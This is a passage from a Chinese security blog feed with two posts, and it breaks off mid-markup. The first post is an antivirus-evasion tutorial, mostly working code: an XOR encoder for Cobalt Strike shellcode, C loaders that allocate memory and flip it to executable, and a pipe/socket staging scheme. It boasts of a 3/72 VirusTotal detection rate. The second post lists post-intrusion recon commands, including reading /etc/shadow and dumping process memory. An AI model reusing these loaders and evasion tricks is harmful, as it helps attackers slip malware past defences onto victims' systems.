        <content type="html"><![CDATA[<h1 id="静态恶意代码逃逸1"><a href="#静态恶意代码逃逸1" class="headerlink" title="静态恶意代码逃逸1"></a>静态恶意代码逃逸1</h1><p>最近在学习从底层用C/C++去实现免杀，而看到了关于静态恶意代码逃逸的一些很好的文章，在此记录总结一下</p><a id="more"></a><h2 id="恶意代码与shellcode"><a href="#恶意代码与shellcode" class="headerlink" title="恶意代码与shellcode"></a>恶意代码与shellcode</h2><p>Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode</p><h2 id="CS生成的raw文件与C文件"><a href="#CS生成的raw文件与C文件" class="headerlink" title="CS生成的raw文件与C文件"></a>CS生成的raw文件与C文件</h2><p>在CS中，生成的Shellcode可以为raw文件和C文件<br><img src="https://s2.loli.net/2022/10/17/7hBy9ialGgvKAfj.png" alt="raw"><br><img src="https://s2.loli.net/2022/10/17/aLuKOBbCd7TNWwv.png" alt="C"><br>在英文中，raw可以被译为 生的，未加工的，而CS生成出来的就是bin文件，故raw文件是可以直接进行字节操作读取的，因此加载到内存较为方便<br>而C文件给出的是一个C语言中的字符数组，也是可以通过以字节单位操作的</p><h3 id="对于载荷的混淆"><a href="#对于载荷的混淆" class="headerlink" title="对于载荷的混淆"></a>对于载荷的混淆</h3><p>核心思想是将shellcode进行混淆，而这里我们使用的是XOR</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">new_shellcode = <span class="hljs-built_in">ord</span>(old_shellcode) ^ key<br></code></pre></td></tr></table></figure><p>这里贴一下大佬的代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser, FileType<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_bin</span>(<span class="hljs-params">num, src_fp, dst_fp, dst_raw</span>):</span><br>    shellcode = <span class="hljs-string">&#x27;&#x27;</span><br>    shellcode_size = <span class="hljs-number">0</span><br>    shellcode_raw = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            code = src_fp.read(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> code:<br>                <span class="hljs-keyword">break</span><br><br>            base10 = <span class="hljs-built_in">ord</span>(code) ^ num<br>            base10_str = <span class="hljs-built_in">chr</span>(base10)<br>            shellcode_raw += base10_str.encode()<br>            code_hex = <span class="hljs-built_in">hex</span>(base10)<br>            code_hex = code_hex.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(code_hex) == <span class="hljs-number">1</span>):<br>                code_hex = <span class="hljs-string">&#x27;0&#x27;</span> + code_hex<br>            shellcode += <span class="hljs-string">&#x27;\\x&#x27;</span> + code_hex<br>            shellcode_size += <span class="hljs-number">1</span><br>        src_fp.close()<br>        dst_raw.write(shellcode_raw)<br>        dst_raw.close()<br>        dst_fp.write(shellcode)<br>        dst_fp.close()<br>        <span class="hljs-keyword">return</span> shellcode_size<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        sys.stderr.writelines(<span class="hljs-built_in">str</span>(e))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    parser = ArgumentParser(prog=<span class="hljs-string">&#x27;Shellcode X&#x27;</span>, description=<span class="hljs-string">&#x27;[XOR The Cobaltstrike PAYLOAD.BINs] \t &gt; Author: rvn0xsy@gmail.com&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-v&#x27;</span>,<span class="hljs-string">&#x27;--version&#x27;</span>,nargs=<span class="hljs-string">&#x27;?&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>,<span class="hljs-string">&#x27;--src&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;source bin file&#x27;</span>,<span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;rb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-d&#x27;</span>,<span class="hljs-string">&#x27;--dst&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;destination shellcode file&#x27;</span>,<span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;w+&#x27;</span>),required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-n&#x27;</span>,<span class="hljs-string">&#x27;--num&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;Confused number&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">90</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-r&#x27;</span>,<span class="hljs-string">&#x27;--raw&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;output bin file&#x27;</span>, <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;wb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    args = parser.parse_args()<br>    shellcode_size = process_bin(args.num, args.src, args.dst, args.raw)<br>    sys.stdout.writelines(<span class="hljs-string">&quot;[+]Shellcode Size : &#123;&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(shellcode_size))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><code>python3 .\xor_shellcoder.py -s .\payload.bin  -d payload.c -n 10 -r out.bin</code></p><h3 id="内存混淆加载"><a href="#内存混淆加载" class="headerlink" title="内存混淆加载"></a>内存混淆加载</h3><p>Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。<br>而在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。<br>申请方式有我们比较熟悉的<code>malloc,new</code>,而后续我们可能用到更多的是<code>VirtualAlloc</code>，其申请内存的单位为”页”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<span class="hljs-comment">//基址</span><br>    shellcode_size,<span class="hljs-comment">//大小</span><br>    MEM_COMMIT,<span class="hljs-comment">//内存页状态,申请新的内存，保留原来的块(只能在原来的块上提交)</span><br>    PAGE_EXECUTE_READWRITE<span class="hljs-comment">//可读可写可执行</span><br>    );<br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br></code></pre></td></tr></table></figure><h3 id="优化内存申请"><a href="#优化内存申请" class="headerlink" title="优化内存申请"></a>优化内存申请</h3><p>在申请内存页时，将其权限更改，因为直接赋予一个新内存可读可写可执行时的权限时，很容易被杀软查杀，所以我们可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br>    );<br><br>    <span class="hljs-comment">// 将shellcode复制到可读可写的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br><span class="hljs-comment">// 这里开始更改它的属性为可执行</span><br>VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br></code></pre></td></tr></table></figure><h3 id="优化混淆"><a href="#优化混淆" class="headerlink" title="优化混淆"></a>优化混淆</h3><p>我们之前在混淆Shellcode时，用到的是异或运算，常常杀软会对这种异或操作比较敏感，而在windows核心编程中，有相应的API可以直接使用，有<code>InterlockedXorRelease</code>该函数，可以直接用于两个值的异或运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    _InterlockedXor8(buf+i,<span class="hljs-number">10</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分离免杀与管道通信"><a href="#分离免杀与管道通信" class="headerlink" title="分离免杀与管道通信"></a>分离免杀与管道通信</h3><p>分离免杀指的是将恶意代码放置在程序本身之外的一种加载方式，这个很好理解，主要是管道通信，简单的解释是：通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节<br>但这么解释还是比较抽象<br>首先我们先考虑进程通信的目的</p><ul><li>数据传输：一个进程需要将它的数据发送给另一个进程</li><li>资源共享：多个进程之间共享同样的资源。</li><li>通知事件：一个进程需要向另一个或一组进程发送消息，通知它（它们）发生了某种事件（如进程终止时要通知父进程）。</li><li>进程控制：有些进程希望完全控制另一个进程的执行（如Debug进程），此时控制进程希望能够拦截另一个进程的所有陷入和异常，并能够及时知道它的状态改变。</li></ul><p>而管道则是管道是Unix中最古老的进程间通信的形式，我们把从一个进程连接到另一个进程的一个数据流称为一个“管道 ”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-comment">//功能:创建一个无名管道</span><br><span class="hljs-comment">//函数原型</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd[<span class="hljs-number">2</span>])</span></span>;<br><span class="hljs-comment">//参数</span><br><span class="hljs-comment">//fd：文件描述符数组,其中fd[0]表示读端, fd[1]表示写端</span><br><span class="hljs-comment">//返回值:成功返回0，失败返回-1</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/10/17/fhkzOLd82j46Nlp.png" alt="管道通信"></p><p>因此，我们尝试使用管道通信，我们的目的主要是通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程，下面分别为服务端与客户端，管道通信核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recv</span><span class="hljs-params">()</span></span>&#123;<br>HANDLE hPipeClient;<br>    DWORD dwWritten;<br>    DWORD dwShellcodeSize = <span class="hljs-keyword">sizeof</span>(buf);<br>    <span class="hljs-comment">// 等待管道可用</span><br>    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);<br>    <span class="hljs-comment">// 连接管道</span><br>    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="hljs-literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">hPipe = CreateNamedPipe(<br>        ptsPipeName,<br>        PIPE_ACCESS_INBOUND,<br>        PIPE_TYPE_BYTE| PIPE_WAIT,<br>        PIPE_UNLIMITED_INSTANCES,<br>        BUFF_SIZE,<br>        BUFF_SIZE,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><h3 id="优化管道通信"><a href="#优化管道通信" class="headerlink" title="优化管道通信"></a>优化管道通信</h3><p>在一个程序里同时启动两个管道通信端口进行传输，还是很容易被查杀，下面尝试用网络套接字（SOCKET）来进行通信，将两个管道通信端分开编译<br>服务端核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>WSADATA wsaData;<br>SOCKET socks;<br>SOCKET sClient;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">s_client</span>;</span><br>INT nAddrLen = <span class="hljs-keyword">sizeof</span>(s_client);<br>SHORT sListenPort = <span class="hljs-number">8888</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br></code></pre></td></tr></table></figure><p>客户端核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>WSADATA wsaData;<br>SOCKET socks;<br>SHORT sListenPort = <span class="hljs-number">8888</span>;<br><span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br><span class="hljs-built_in">sin</span>.sin_port = htons(sListenPort);<br><span class="hljs-built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="hljs-string">&quot;192.168.170.1&quot;</span>);<br></code></pre></td></tr></table></figure><p>在利用网络套接字的管道通信下分开编译，此时的免杀效果已经十分显著了，3/72<br><img src="https://s2.loli.net/2022/10/17/bXyrWgxY1jzoIJG.png" alt="virustotal"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透_信息收集</title>
      <link href="2022/10/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2022/10/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>对于内网渗透学习的笔记记录</p><a id="more"></a><h2 id="内网组成"><a href="#内网组成" class="headerlink" title="内网组成"></a>内网组成</h2><ul><li>容器</li><li>云服务</li><li>路由器</li><li>服务器</li><li>打印机</li><li>交换机</li><li>k8s集群</li><li>Openstack</li><li>Linux系统</li><li>MacOS系统</li><li>Windows系统</li><li>Windows AD域</li></ul><h2 id="内网渗透思路"><a href="#内网渗透思路" class="headerlink" title="内网渗透思路"></a>内网渗透思路</h2><ul><li>公网-&gt;内网</li><li>信息搜集</li><li>漏洞扫描</li><li>漏洞挖掘</li><li>漏洞利用</li><li>开始攻击</li><li>权限维持</li><li>持 久 化</li><li>权限提升</li><li>免杀隐藏</li><li>横向移动</li><li>痕迹清理</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">whoami<br>who/w<br>id<br>finger<br>cat <span class="hljs-regexp">/etc/</span>passwd<br>cat <span class="hljs-regexp">/etc/</span>shadow<br>cat <span class="hljs-regexp">/etc/g</span>shadow<br>cat <span class="hljs-regexp">/etc/g</span>roup<br></code></pre></td></tr></table></figure><h4 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h4><ol><li>进程信息<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> aux<br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-efl</span><br>top<br>pstree <span class="hljs-literal">-aup</span><br></code></pre></td></tr></table></figure></li><li>端口进程<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> lsof -i:<span class="hljs-number">22</span><br><span class="hljs-attribute">sudo</span> netstat -tunlp | grep <span class="hljs-number">53</span><br></code></pre></td></tr></table></figure></li><li>关闭进程<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> PID<br></code></pre></td></tr></table></figure><h4 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h4></li><li>主机名称<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">uname -a</span><br></code></pre></td></tr></table></figure></li><li>内核版本<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">uname -srm<br>hostnamectl<br>hostnamectl | <span class="hljs-keyword">grep</span> -i kernel<br>cat <span class="hljs-regexp">/proc/</span>version<br></code></pre></td></tr></table></figure></li><li>CPU信息<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">lscpu<br>cat <span class="hljs-regexp">/proc/</span>cpuinfo<br></code></pre></td></tr></table></figure></li><li>内存信息<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">free -m -w<br>cat <span class="hljs-regexp">/proc/m</span>eminfo <br></code></pre></td></tr></table></figure></li><li>交换分区<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">free -m -w<br>cat <span class="hljs-regexp">/proc/m</span>eminfo <br></code></pre></td></tr></table></figure></li><li>环境变量<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">set</span><br></code></pre></td></tr></table></figure><h4 id="启动信息"><a href="#启动信息" class="headerlink" title="启动信息"></a>启动信息</h4></li></ol><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">schtasks</span><br></code></pre></td></tr></table></figure><h4 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>password<br>cat <span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure><h4 id="票据信息"><a href="#票据信息" class="headerlink" title="票据信息"></a>票据信息</h4><h4 id="磁盘信息"><a href="#磁盘信息" class="headerlink" title="磁盘信息"></a>磁盘信息</h4><h4 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h4><ol><li>查看网络信息<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure></li><li>查看host信息<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure></li><li>查看网卡信息<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ifconfig<br>arp -a<br>route print<br>netstat -anot<br>Get-NetTCPConnection<br></code></pre></td></tr></table></figure><h4 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h4></li></ol><h4 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> query<br>wmic service list brief<br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">select</span> PathName<br></code></pre></td></tr></table></figure><h4 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h4><h4 id="软件信息"><a href="#软件信息" class="headerlink" title="软件信息"></a>软件信息</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span>,<span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><h4 id="驱动信息"><a href="#驱动信息" class="headerlink" title="驱动信息"></a>驱动信息</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">DRIVERQUERY</span><br></code></pre></td></tr></table></figure><h4 id="后缀信息"><a href="#后缀信息" class="headerlink" title="后缀信息"></a>后缀信息</h4><h4 id="注册表信息"><a href="#注册表信息" class="headerlink" title="注册表信息"></a>注册表信息</h4><h4 id="防火墙信息"><a href="#防火墙信息" class="headerlink" title="防火墙信息"></a>防火墙信息</h4><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="用户信息-1"><a href="#用户信息-1" class="headerlink" title="用户信息"></a>用户信息</h4><ol><li>用户名称<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> 查看当前用户名称<br>whoami 查看当前用户名称 <br>quser（query <span class="hljs-keyword">user</span>） 查看当前用户名称<br>wmic useraccount <span class="hljs-keyword">get</span> /<span class="hljs-keyword">ALL</span> /<span class="hljs-keyword">format</span>:csv<br></code></pre></td></tr></table></figure></li><li>用户权限<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators<br></code></pre></td></tr></table></figure><h4 id="进程信息-1"><a href="#进程信息-1" class="headerlink" title="进程信息"></a>进程信息</h4></li><li>查看进程<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">tasklist</span><br><span class="hljs-string">get</span>-<span class="hljs-string">process</span><br><span class="hljs-string">wmic</span> <span class="hljs-string">process</span> <span class="hljs-string">get</span> <span class="hljs-string">caption</span>,<span class="hljs-string">executablepath</span>,<span class="hljs-string">commandline</span> /<span class="hljs-string">format:csv</span><br></code></pre></td></tr></table></figure></li><li>筛选进程<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">tasklist</span> | <span class="hljs-string">findstr</span> <span class="hljs-string">&quot;explorer.exe&quot;</span><br><span class="hljs-string">tasklist</span> /<span class="hljs-string">fi</span> <span class="hljs-string">&quot;ImageName eq explorer.exe&quot;</span><br><span class="hljs-built_in">get-process</span> | <span class="hljs-string">findstr</span> <span class="hljs-string">&quot;explorer.exe&quot;</span><br></code></pre></td></tr></table></figure></li><li>进程端口<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -ano <span class="hljs-string">| findstr &quot;</span><span class="hljs-number">80</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure></li><li>进程内存<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">procdump</span>  <span class="hljs-comment">#利用工具</span><br></code></pre></td></tr></table></figure></li><li>进程权限<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br></code></pre></td></tr></table></figure></li><li>进程模块<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/fi</span> <span class="hljs-string">&quot;ImageName eq explorer.exe&quot;</span> <span class="hljs-string">/m</span><br></code></pre></td></tr></table></figure></li><li>模块搜索<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /<span class="hljs-keyword">fi</span> <span class="hljs-string">&quot;MODULES eq capauthz.dll&quot;</span><br></code></pre></td></tr></table></figure><h4 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h4></li><li>主机名称<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">hostname<br>[<span class="hljs-symbol">System.Net.DNS</span>]:<span class="hljs-link">:GetHostByName($Null)</span><br></code></pre></td></tr></table></figure><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4></li><li>查看变量<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">set</span><br></code></pre></td></tr></table></figure></li><li>设置变量<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">test</span>=Glacier 一次性<br>setx test <span class="hljs-string">&quot;Glacier&quot;</span> 永久<br></code></pre></td></tr></table></figure><h4 id="系统版本"><a href="#系统版本" class="headerlink" title="系统版本"></a>系统版本</h4><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ver</span> 查看当前服务器操作系统版本<br>systeminfo 查看当前系统版本与补丁信息<br></code></pre></td></tr></table></figure><h4 id="启动信息-1"><a href="#启动信息-1" class="headerlink" 